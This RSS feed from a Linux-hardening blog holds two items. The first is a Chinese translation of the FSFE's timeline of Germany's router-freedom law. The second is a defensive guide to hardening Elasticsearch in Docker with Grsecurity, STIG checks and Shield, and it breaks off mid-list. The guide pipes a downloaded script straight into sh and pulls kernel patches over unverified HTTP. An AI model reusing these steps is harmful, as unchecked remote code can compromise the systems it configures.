<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Hardened GNU/Linux</title>
    <description>We are a group of free software enthusiasts, anarchists, cyber security researchers. Long live anarchy! Long live 0ld sch00l!!!
</description>
    <link>http://www.hardenedlinux.org/</link>
    <atom:link href="http://www.hardenedlinux.org/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 04 Nov 2015 12:47:37 +0800</pubDate>
    <lastBuildDate>Wed, 04 Nov 2015 12:47:37 +0800</lastBuildDate>
    <generator>Jekyll v2.5.3</generator>
    
      <item>
        <title>Timeline of compulsory routers</title>
        <description>&lt;p&gt;原文地址 &lt;a href=&quot;https://fsfe.org/activities/routers/timeline.en.html&quot;&gt;Timeline of compulsory routers&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Shawn: 德国今年通过了“路由器自由”的法案来保证所有的运营商必须允许用户自由的选择路由器进行接入，包括OpenWRT等自由软件实现。这一法案对保护用户的软件自由以及数字权利有促进作用，月初FSFE工作人员联系我们谈到希望有相关信息的中文翻译，之后h4rdenedzer0成员参与了翻译工作。&lt;/p&gt;

&lt;p&gt;By:n3o4po11o&lt;/p&gt;

&lt;p&gt;译者注:compulsory routers指在用户在使用通信运营商提供的接入互联网服务时，只能使用特定的路由。&lt;/p&gt;

&lt;p&gt;“compulsory routers”因为其过程非常复杂而成为一个非常有意思的话题。很多政府部门、公司和团体已经参与到了其中，热烈的参与了讨论和吸取意见。下面是FSFE（欧洲自由软件基金会）列出了推动“路由器自由”法案到现在这个阶段的重要里程碑，也可以展望“路由器自由”法案的未来&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;现在与未来&lt;/h2&gt;

&lt;p&gt;德国联邦经济和能源部(BMWi)修订之前的通信法案修订版的提案。来保证用户能够自由地选择路由器。我们评估后觉得该草案很大程度上起着积极的作用，因为它终于能够结束用户选择路由器进行接入时所受到的差别对待。只有一小部分措辞需要阐述得更加精确来提前避免法律漏洞。&lt;/p&gt;

&lt;p&gt;在7月之前，这个提案已经提交给欧盟委员会(EU commission)和成员国进行审批。据我们所得到的消息可以知道，在这个过程中只有一个有一&amp;gt;点点不严禁的地方受到修改。修正版本在8月中旬已经通过了德国联邦内阁的审查。在不久的将来这个草案将会送至德国联邦议院进行审查。我们祝愿联邦议员和代表们能够承受得住那些敌对势力(不希望该草案通过的那些人)的压力，能够捍卫和恢复互联网用户的权利。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;12.08.2015：德国联邦议会通过了”路由器自由”法案，对于FSFE来说这是一件好事。紧接在欧盟委员会7月8号发布通告和解释名词之后。在这个阶段只有一小部分措辞受到修改。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;25.02.2015：德国联邦经济和能源部发布了第一个禁止强制要求用户选择特定路由的法律草案。除了缺少强制措施以外FSFE还是很欢迎这个草案。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;29.09.2014：在经历了未来计划不清晰的一段漫长时期。Netzpolitik.org发布了一个transparency bill的内部修正草案。FSFE批评了这个草案，因为它从法律上使得用户放弃了选择的权力。而不是像三当联合声明那样，这个草案使得通信运营商有权利禁止用户使用其他设备进行接入。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;28.03.2014：和CCC还有其他项目还有专家们一起，FSFE赞扬德国联邦网络局发布的试行法案和详尽的声明，但明确的批评用户会增加负担以及提出的测试方案没有一致性的考虑。而最有意思的是，正式的条例本质上比三党联合声明更弱了，甚至没有指及“网络的终点”到底界限在那。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;24.02.2014：在第一个大型听众会之后，德国联邦网络局发布了一个“transparency     bill”，意在消除compulsory routers并要求通信运营商必须提升对用户的透明度。在14年3月底之前运营商应该执行这个意见（译者注：原文为Comments may be submitted until the end of March 2014.）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;16.12.2013：在11月底的德国联邦议院选举之后，德国CDU党、CSU党和SPD党的联合执政协议正式签署。他们三党都明确的表示反对compulsory routers并要求必须主动让每一个客户都收到所有需要的信息。这么高级别的联合体发表&amp;gt;的声明通过媒体的传播和科普使得民众们产生了巨大的兴趣。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;04.11.2013：紧接着公众听证会之后，FSFE通过和其他组织或者个体一样发送一个公开声明给德国联邦网络局。这个声明包含了几乎所有之前公开提出的问题的答案，并且特别对compulsory routers现在及可能存在的缺点表示担心。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;20.09.2013：德国联邦网络局发起了一次关于“网络的终点”的公众听证会。在听证会中，很多问题当中有着非常强的专业性而这些问题所涉及到的定义都被提及了，因为这些定义都直接与compulsory routers有关。几天过后FSFE发布了一个初步声明，在声明中表达了对安全、用户友好性以及竞争的严重关切。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;31.07.2013：在第二个“网络中立原则”草案中，在第三页讨论了compulsory routers，但和第一个草案相反的是，第二个草案使用了“terminal device net neutrality”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;25.06.2013：联邦网络局组织了一个针对”compulsory routers”的研讨会，并设计了4个用于议案的模型&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;17.06.2013：德国联邦经济和能源部提出网络中立原则的草案。在其中compulsory     router被特别标识出来并且反对。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;04.06.2013：德国联邦政府对5月17号的”minor interpellation”进行回复。在这个回复中，政府对待这些问题非常小心而且很负责。这样的态度或多或少的影响了德国联邦网络局。自从德国联邦网络局在这个话题当中还把重心放在网络运营商和路由制造商当中，德国联邦经济和能源部(BMWi)还没有考虑要参与到这个话题当中。一篇在Netzpolitik的文章全面的总结了这个事件。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;17.05.2013：社会主义者团体“DIE LINKE”发布了一篇“minor interpellation”给德国联邦政府，其内容是关于德国联邦网络局发表的一些声明。在文章中问到“路由是否有资格当作接入点或者电信设备”以及“用户到底能对其造成多大的影响”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;22.01.2013：此外还有德国通信设备制造商AVM评论了这个问题并举了“手机市场中通信服务的提供者没有指定用户必须使用什么手机”的例子&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;10.01.2013：关于讨论compulsory routers的根源可以追溯到“德国联邦网络局对一个匿名用户的评论”。这个用户批评他DSL合约绑定着一个特定型号的路由。他这样的反应使得一个个人杂志“PC-WELT”发布了一篇展开这个话题的文章。DSL运营商这样做法受到了批评。而德国联邦网络局觉得运营商这样的做法合乎情理，因为DSL运营商将路由器定义为其网络的一部分，所以这样的基础设施应该由运营商提供。因此，用户不能将其用其他设备来更换。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Sat, 03 Oct 2015 09:30:02 +0800</pubDate>
        <link>http://www.hardenedlinux.org/translation/2015/10/03/Translation-Timeline-of-compulsory-routers.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/translation/2015/10/03/Translation-Timeline-of-compulsory-routers.html</guid>
        
        
        <category>translation</category>
        
      </item>
    
      <item>
        <title>社区最佳实践：基于PaX/Grsecurity &amp; STIG &amp; Sheild针对es的Docker场景化加固</title>
        <description>&lt;p&gt;By: 炼石网络CipherGateway&lt;/p&gt;

&lt;h1 id=&quot;hardening-esin-docker-with-paxgrsecurity--stig--shield&quot;&gt;Hardening es(in docker) with PaX/Grsecurity &amp;amp; STIG &amp;amp; Shield&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;文档说明&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;em&gt;基础平台&lt;/em&gt;：此实践文档使用&lt;a href=&quot;http://https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options#Disallow_access_to_overly-permissive_IPC_objects&quot;&gt;PaX/Grsecurity&lt;/a&gt;完成Linux内核级别的加固，并采用美国DISA组织的STIG脚本对Debian GNU/Linux发行版进行安全扫描，以使Debian GNU/Linux发行版安全达到一定的高度。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;业务方面&lt;/em&gt;：以在Docker下运行的ElasticSearc服务为例，结合ES的&lt;a href=&quot;http://https://www.elastic.co/guide/en/shield/current/index.html&quot;&gt;Shield&lt;/a&gt;插件对ES进行业务级别的加固。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;基本步骤如下：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1、最小化安装Debian8 GNU/Linux&lt;/p&gt;

&lt;p&gt;2、使用PaX/Grsecurity加固&lt;/p&gt;

&lt;p&gt;3、使用STIG验证&lt;/p&gt;

&lt;p&gt;4、使用Shield对ElasticSearch进行业务级别的加固&lt;/p&gt;

&lt;p&gt;5、完善物理机RBAC系统，达到最小权限要求&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;debian8-gnulinux&quot;&gt;1、最小化安装Debian8 GNU/Linux系统&lt;/h2&gt;

&lt;p&gt;1）在服务器上插入U盘，连接好网线，配置网络：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Y8ZBvBJ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2）为硬盘分区：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/omVXCcF.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3）软件环境安装：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/GV5UIz9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/sHqiWQv.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4）系统安装完成：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/zBfEUEQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;加固前准备&lt;/h3&gt;

&lt;p&gt;1）在root下打开/etc/apt/sources.list，确定是否有以下三个debian的源，若没有自行添加,并且注释或删掉其他的软件源，尽量避免使用非社区源：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;nano /etc/apt/sources.list
deb http://ftp.debian.org/debian jessie main contrib
deb http://security.debian.org/jessie/updates main contrib
deb http://ftp.debian.org/debian jessie-updates main contrib

apt-get update
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）安装sudo&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install sudo
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;修改sudoers文件，添加一句（等效于添加当前用户到sudo用户组，或者直接使用root用户可忽略此步）:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; nano /etc/sudoers
 add &quot;user   ALL=(ALL:ALL)ALL&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3）安装make&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get install make
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;paxgrsecurity&quot;&gt;2、使用PaX/Grsecurity加固&lt;/h2&gt;

&lt;p&gt;这次加固主要用到的是一个增强内核安全的工具Grsecurity，和SELinux以及Apparmor一样，是用来控制文件访问权限的安全工具。&lt;/p&gt;

&lt;p&gt;1）Grsecurity需要打包到内核，所以需要重新编译内核，由于grsec长期支持的内核版本是3.14.48，而debian8的内核版本是3.16，所以我们要将内核版本降到3.14.48，查看内核版本命令:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat /proc/version
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）到kernel.org下载相应的目标内核版本源代码:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; wget https://kernel.org/pub/linux/kernel/v3.x/linux-3.14.48.tar.xz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3)到Grsecurity下载相应的patch，注意必须要和内核版本一致(先到http://grsecurity.net/download.php查看“grsecurity - stable kernel patch”和“paxctld - PaX flags maintenance daemon - binary packages”的版本):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; wget http://grsecurity.net/stable/grsecurity-3.1-3.14.48-201507261203.patch
 wget http://grsecurity.net/paxctld/paxctld_1.0-2_amd64.deb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4）编译前安装支持插件的gcc：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; apt-get install libncurses* kernel-package build-essential
 gcc --version
 apt-get install gcc-`gcc --version`-plugin-dev（gcc --version用大版本即可 例如4.9而不是4.9.2）
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5）解压缩内核包和补丁包，给内核打patch:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;xz -d linux-3.14.48.tar.xz
tar -xvf linux-3.14.48.tar
cd linux-3.14.48/
patch -p1 &amp;lt; ../grsecurity-3.1-3.14.48-201507261203.patch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）配置内核：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;make menuconfig
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;grsecurity&quot;&gt;开始配置Grsecurity选项&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;Note：该文档的配置选项仅测试在Debian8 GNU/Linux中。（业务：启动docker，并在其中运行ElasticSearch服务）&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;关于Grsecurity具体的配置选项请参照：&lt;a href=&quot;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&quot;&gt;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;7)开启Grsecurity支持&lt;/p&gt;

&lt;p&gt;执行命令后会出现配置窗口：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;在配置界面按下键盘选择&quot;security options&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/HGIQswO.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;security options --&amp;gt; Grsecurity
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/CYR2XEe.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;按空格选上Grsecurity(NEW)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/RW83QSo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/w85poOM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;8）选择automatic后Grsecurity将自动根据通用标准形成一系列配置，但仍可在
Customer Configuration中进行更细致的加固措施的划分，二者效果会叠加。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Configuration Method --&amp;gt;选择 automatic
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/GYO41kc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;9）优先选项选择Security优先&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Required Priority--&amp;gt;Security
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/d8c6c741jw1evo9ufrg99j20ke0cajth.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;10）去掉mprotect限制。因为Grsecurity默认禁止mprotect功能，而这会使JVM无法运行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Security Options --&amp;gt;Grsecurity --&amp;gt;customize configuration --&amp;gt;PAX --&amp;gt;Nonexcutable pages--&amp;gt;disable  restrict mprotect
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/d8c6c741jw1ev1140ill5j20ll0dqwhl.jpg&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;http://ww1.sinaimg.cn/large/d8c6c741jw1ev115fx6koj20lr0dogog.jpg&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;http://ww4.sinaimg.cn/large/d8c6c741jw1ev1166ekopj20lq0dg77k.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;11）为了docker能正常运行，去掉chroot下’chmod+s’和’mknod’的限制&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Security Options --&amp;gt;Grsecurity --&amp;gt;customize configuration --&amp;gt;FileSystem Protections--&amp;gt;Deny (f)chmod +s &amp;amp;&amp;amp; Deny mknod
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/d8c6c741jw1evo9ux6odcj20ke0cewhz.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;12)去除USB限制（看业务需求）&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Security Options --&amp;gt;Grsecurity --&amp;gt;customize configuration --&amp;gt;Physical Protections--&amp;gt;Deny new USB connections after toggle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/d8c6c741jw1evo9vgclhoj20kh0cadil.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;13)其余选项保持默认，Save之后退出内核配置窗口。&lt;/p&gt;

&lt;p&gt;14)完成之后执行编译内核命令，这一步需要较长时间&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;make deb-pkg -j'cpu核心数+1' 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;15）编译之后安装：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd ..
dpkg -i linux*.deb 
dpkg -i paxctld_1.0-2_amd64.deb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;16）安装完成重启即可，重启时选择新内核&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;paxctld -d
sudo reboot
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在启动界面选择高级选项&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/d8c6c741jw1evrj57c193j20iv0dwwgu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;选择已加固的内核&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/d8c6c741jw1evrj6wg06dj20ii0dxad7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;17) 重启之后&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;su - root
paxctld -d
exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;18)安装&lt;a href=&quot;https://en.wikibooks.org/wiki/Grsecurity/The_Administration_Utility&quot;&gt;gradm&lt;/a&gt;工具&lt;/p&gt;

&lt;p&gt;&lt;em&gt;这是RBAC系统的管理工具，使用它可以配置/etc/policy规则文件来定义每个用户的权限，也可通过gradm的学习模式来自动生成policy文件。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note：安装gradm之前必须保证在已有Grsecurity加固的内核上，并且系统有（lex或flex）和（byacc或bison）&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;下载相应的组件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install flex
apt-get install bison
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下载gradm：（或者到Grsecurity官网下载最新版）&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget http://grsecurity.net/stable/gradm-3.1-201507191652.tar.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;开始安装：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar zxvf gradm-3.1-201507191652.tar.gz
cd gradm
make nopam (无PAM支持）
sudo make install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;安装结束后，要求输入gradm的管理密码，注意不要与root密码相同，否则降低了Grsecurity的安全防护。
另外，将会在/sbin下安装gradm和grlearn程序。并在/etc/grsec目录下生成learn_config和policy两个文件。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;关于使用gradm对系统权限进行细分将在下面提及。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;19)	卸载旧内核(&lt;em&gt;Note：dpkg确定内核版本号，remove掉相应的内核deb包，请替换后再执行命令&lt;/em&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dpkg -l | grep linux-headers（若没有3.16的headers则可略去下面的apt-get remove linux-headers-''）
dpkg -l | grep linux-image
sudo apt-get remove linux-headers-'' linux-image-''(注意：这一步使用前两个命令得到的信息替换''里的内容）
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此时再重启计算机会发现现在只有Linux 3.14.48-grsec的内核了。&lt;/p&gt;

&lt;p&gt;20） 卸载编译工具链&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get remove kernel-package build-essential
sudo apt-get remove libncursesada-dbg  libncursesada3-dev libncursesada-doc libncurses5-dbg libncurses5-dev libncursesw5-dbg  libncurses-gst libncursesw5-dev libncursesada3
sudo apt-get autoremove
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;至此Grsecurity的第一步加固完成。若以后在系统运行时需要修改某些特性，可在/etc/sysctl.conf中对相应的条目进行修改。具体条目对应的选项请参看&lt;a href=&quot;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&quot;&gt;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;stig&quot;&gt;3、使用STIG验证&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;STIG（安全技术实现指南）是由DISA为了IT安全态势给DoD(美国国防部）提供的一套防御指南。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;NOTE：STIG是一组庞大的集合，且针对OS的部分官方只针对RHEL。这里的STIG指的是h4rdenedzer0(http://hardenedlinux.org/about/) 的stig-4-debian项目&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1） 将github中STIG的脚本文件克隆到本地：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/hardenedlinux/STIG-4-Debian.git
cd STIG-4-Debian
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2） 使用方法&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;usage: check.sh [options]

  -c    Output Log with catable colors
  -s    Perform STIG checking with NORMAL output log
  -v    Show version
  -h    Show this message
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3） 执行脚本&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo ./check.sh -s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4) 脚本对内核执行完毕后我们可以看到在/var/log下生成了一个100K左右名为STIG-Checking-2015-??-??.log的日志，即为STIG对内核进行安全扫描的结果。&lt;/p&gt;

&lt;p&gt;其中，日志中为FAIL的条目表示未达到STIG安全标准的项目，PASS的项目为通过STIG验证的项目。我们接下来要做的工作就是通过修改内核选项尽可能地使所有FAIL的条目变成PASS。&lt;/p&gt;

&lt;p&gt;5）示例：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/d8c6c741jw1evrrl7g6obj20m60dk409.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在上图中可看到一个FAIL的条目是”The /etc/shadow file must be group-owned by root”,Vulnerability是该条目的漏洞分析，Fix text是解决方法。&lt;/p&gt;

&lt;p&gt;为了解决该问题，执行Fix text中提示的命令：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;chgrp root /etc/shadow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;修改后：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/d8c6c741jw1evrs5ykn7bj20kn018t8m.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到，按Fix text修改后该条目通过STIG验证。&lt;/p&gt;

&lt;p&gt;6）STIG总结&lt;/p&gt;

&lt;p&gt;STIG是由DISA为了IT安全态势给美国国防部提供的一套安全指南，据说DoD的应用在上线前都会使用这个指南进行安全强化。在日志内容上看来也的确有不少值得借鉴之处。&lt;/p&gt;

&lt;p&gt;综上，尽可能把其余的FAIL条目按照STIG标准进行修改达到PASS，使系统安全到达更高一个层次。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;以上即为Linux内核加固的实践内容。接下来是结合ElasticSearch进行业务层面的加固，具体部分包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在docker下运行ES，并使用Shield对ES进行加固————安全认证及RBAC系统&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在物理机上配置RBAC系统，达到系统最小权限————主要为gradm工具的使用&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;shieldelasticsearch&quot;&gt;4、使用Shield对ElasticSearch进行业务级别的加固&lt;/h2&gt;

&lt;h3 id=&quot;shield&quot;&gt;介绍Shield&lt;/h3&gt;

&lt;p&gt;Shield是一个为了使ElasticSearch更安全而产生的一个插件。在Shield的安全加固中包括安全认证机制，RBAC系统，IP过滤和系统审计。&lt;/p&gt;

&lt;p&gt;下面的加固将通过配置安全认证机制和RBAC系统来演示加固流程。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;### 配置ElasticSearch

1） 安装docker

    apt-get install curl
    curl -sSL https://get.docker.com | sh

验证docker是否安装成功：`$ docker`

2）启动docker

    sudo service docker start
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;shield-1&quot;&gt;安装Shield&lt;/h3&gt;

&lt;p&gt;1) 安装需求:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;安装了Java7或更新版本&lt;/li&gt;
  &lt;li&gt;Shield plugin必须在集群的每个节点都安装，并且每个节点安装完后都要重启。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;2) 启动ES的每个节点：（oaDataNode1等是自定义的节点名称）&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo service docker start
sudo weave launch
sudo weave start 10.0.0.1/24 oaDataNode1
sudo weave start 10.0.0.2/24 oaDataNode2
sudo weave start 10.0.0.3/24 oaDataNode3
sudo weave start 10.0.0.4/24 oaDataNode4
sudo weave expose 10.0.0.254/24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3) 首先进入Docker：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo docker exec -it oaDataNode1 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4) 进入ES的安装目录下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd /usr/es/elasticsearch-1.7.0/bin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5) 安装ElasticSearch许可插件和Shield插件：：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./plugin -i elasticsearch/license/latest
./plugin -i elasticsearch/shield/latest
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）重启ElasticSearch服务&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo weave stop
sudo docker stop oaDataNode2 oaDataNode1 oaDataNode3 oaDataNode4
sudo weave launch
sudo weave start 10.0.0.1/24 oaDataNode1
sudo weave start 10.0.0.2/24 oaDataNode2
sudo weave start 10.0.0.3/24 oaDataNode3
sudo weave start 10.0.0.4/24 oaDataNode4
sudo weave expose 10.0.0.254/24
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;section-1&quot;&gt;安全认证模块&lt;/h3&gt;

&lt;p&gt;1) 新建一个ElasticSearch管理员账户&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./esusers useradd es_admin -r admin(新建一个名为es_admin的用户，角色为admin)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在可以尝试着用RESTFUL API来访问ElasticSearch，会发现访问被拒绝&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -XGET 'http://localhost:9200/'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在请求上加上用户名和密码即可：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -u es_admin -XGET 'http://localhost:9200/'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由此可知，使用Shield新建ES账户后，可以为ES添加严格个安全认证机制。&lt;/p&gt;

&lt;h3 id=&quot;rbac&quot;&gt;RBAC模块&lt;/h3&gt;

&lt;h4 id=&quot;section-2&quot;&gt;知识准备&lt;/h4&gt;

&lt;p&gt;Shield实现了RBAC权限管理系统。在RBAC系统下，所有的行为都会被默认限制，所有用户的权限都与“角色”联系在一起，而每个“角色”代表了一组允许的行为。&lt;/p&gt;

&lt;h5 id=&quot;roles-permissions-and-privileges&quot;&gt;1）Roles, Permissions and Privileges的概念&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;
